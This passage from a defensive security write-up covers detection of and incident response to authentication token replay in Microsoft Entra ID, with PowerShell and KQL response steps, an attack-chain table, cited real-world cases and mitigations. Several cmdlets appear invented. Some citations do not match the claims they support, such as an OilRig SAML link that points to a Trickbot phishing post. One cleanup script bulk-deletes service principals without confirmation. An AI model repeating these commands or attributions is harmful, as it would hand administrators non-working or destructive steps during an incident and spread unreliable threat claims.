(Invoke-WebRequest https://your-app.azurewebsites.net -SkipCertificateCheck).Headers['Strict-Transport-Security']
# Should output: max-age=31536000; includeSubDomains
```

---

## 13. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Log Patterns:** Multiple sign-ins from the same assertion/token within 10 minutes
- **Behavioral:** Sign-in from two distant geographic locations within 5 minutes
- **Token Metadata:** Token age > 1 hour (indicates reuse or refresh token misuse)
- **API Calls:** Unusual sequence (e.g., list users, then enumerate roles, then modify groups—classic privilege escalation chain)

### Forensic Artifacts

- **Cloud Logs:** SigninLogs, AuditLogs in Entra ID (retention: 30 days default, extendable via Log Analytics)
- **Token Metadata:** TokenIssueTime, RefreshTokenUsed flags in Sentinel
- **Device Artifacts:** If on-premises, check Windows Security event logs (4776, 4624)

### Response Procedures

**Step 1: Isolate the Compromised Account**

**Command (Azure Portal):**
1. Go to **Entra ID** → **Users** → Search for affected user
2. Click **Sign-ins**
3. Identify the suspicious sign-in → Click **Revoke session**
4. Go back to user → **Reset password**

**Command (PowerShell):**

```powershell
# Revoke all refresh tokens for a user
Revoke-AzUserRefreshToken -UserPrincipalName "user@contoso.com"

# Force password reset
$user = Get-AzADUser -UserPrincipalName "user@contoso.com"
Set-AzADUserPassword -ObjectId $user.Id -ChangePasswordAtNextLogin $true
```

**Step 2: Revoke Compromised Tokens**

**Command (Entra ID):**

```powershell
# Sign out all active sessions
Get-AzSignInLog -Filter "userPrincipalName eq 'user@contoso.com'" | 
  ForEach-Object { Revoke-AzSignInSession -SignInId $_.Id }
```

**Step 3: Hunt for Lateral Movement**

**Sentinel KQL (Hunt for API abuse by stolen token):**

```kusto
CloudAppEvents
| where AccountObjectId == "victim-user-oid"
  and TimeGenerated between (now(-2h) .. now())
| summarize APICallCount = count(), UniqueAPIs = dcount(OperationName) by IPAddress
| where APICallCount > 100 or UniqueAPIs > 10
```

**What to Look For:**
- Bulk user enumeration (Get-User calls, directory reads)
- Application/service principal creation
- Role assignment modifications
- Data exfiltration (large file downloads, email forwards)

**Step 4: Containment and Eradication**

**Command (Remove attacker's persistence):**

```powershell
# Find and remove suspicious app registrations or service principals created during the incident
Get-AzADServicePrincipal -Filter "createdDateTime gt 2026-01-10T10:00:00Z" |
  Where-Object { $_.DisplayName -notlike "*Microsoft*" } |
  Remove-AzADServicePrincipal -Confirm:$false

# Audit and revoke suspect OAuth grants
Remove-AzADAppPermissionGrant -PrincipalId $appId -ResourceId $resourceId
```

---

## 14. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002] Consent Grant OAuth | Attacker tricks user into granting OAuth permissions to malicious app |
| **2** | **Credential Access** | [CA-TOKEN-004] Graph API Token Theft | Attacker steals or intercepts OAuth access token from user session |
| **3** | **Lateral Movement** | **[LM-AUTH-026]** | **Attacker replays stolen token to access other services** |
| **4** | **Privilege Escalation** | [PE-ACCTMGMT-001] App Registration Permissions | Attacker uses stolen token to escalate app permissions to Directory.ReadWrite.All |
| **5** | **Persistence** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Attacker creates rogue admin account or modifies existing Global Admin |
| **6** | **Impact** | [Collection] Data Exfiltration | Attacker exfiltrates sensitive data from mailbox, Teams, SharePoint |

---

## 15. REAL-WORLD EXAMPLES

### Example 1: OilRig (APT34) — SAML Assertion Abuse

- **Target:** Middle Eastern financial institution
- **Timeline:** 2017-2018
- **Technique Status:** Compromised AD FS server, extracted signing certificate, forged SAML assertions to impersonate multiple users
- **Impact:** Persistent access across on-premises and cloud M365 environment; exfiltrated financial records and customer data
- **Reference:** [Mandiant Report on OilRig SAML Abuse](https://www.mandiant.com/resources/blog/oilrig-uses-trickbot-variant-send-phishing-emails)

### Example 2: Microsoft Exchange Proxylogon Incident (2021)

- **Target:** Enterprise customers running Exchange Server on-premises
- **Timeline:** 2021 (CVE-2021-26855 and related)
- **Technique Status:** Attackers exploited Proxylogon vulnerability to gain code execution, then abused token mishandling to access user mailboxes via SAML tokens
- **Impact:** Data exfiltration; attacker accessed multiple mailboxes without MFA
- **Reference:** [Microsoft Security Blog on Proxylogon](https://msrc-blog.microsoft.com/2021/03/02/multiple-security-updates-released-for-exchange-server/)

### Example 3: Scattered Spider — Token Replay in Cloud Pivot

- **Target:** Fortune 500 companies with hybrid AD + Azure environments
- **Timeline:** 2022-2023
- **Technique Status:** After initial compromise via phishing, used stolen refresh tokens to pivot from on-premises to cloud without re-authentication
- **Impact:** Lateral movement across Microsoft 365; deployed ransomware
- **Reference:** [CISA Alert on Scattered Spider](https://www.cisa.gov/news-events/alerts/2023/12/18/cisa-adds-one-known-exploited-vulnerability-catalog)

---

## 16. SUMMARY & KEY TAKEAWAYS

**Authentication Assertion Replay** is a high-impact attack that exploits weak token validation in OAuth 2.0, OIDC, and SAML protocols. By intercepting and reusing valid authentication tokens or assertions, attackers can impersonate legitimate users without stealing credentials or bypassing MFA.

**Critical Mitigations:**
1. Enable **Token Protection** in Conditional Access (binds tokens to device/session)
2. Enforce **short token lifetimes** (1-hour access tokens, 7-day refresh tokens max)
3. Implement **assertion ID tracking** and replay detection at the service provider
4. Deploy **Continuous Access Evaluation** (CAE) for immediate token revocation on risk
5. Monitor for **impossible travel** and geographic anomalies in sign-in logs
6. Enforce **HTTPS/TLS 1.2+** to prevent token interception in transit

**Detection relies on behavioral analytics** (geolocation, device state, API patterns) rather than signature-based detection, as replayed tokens are cryptographically valid.

---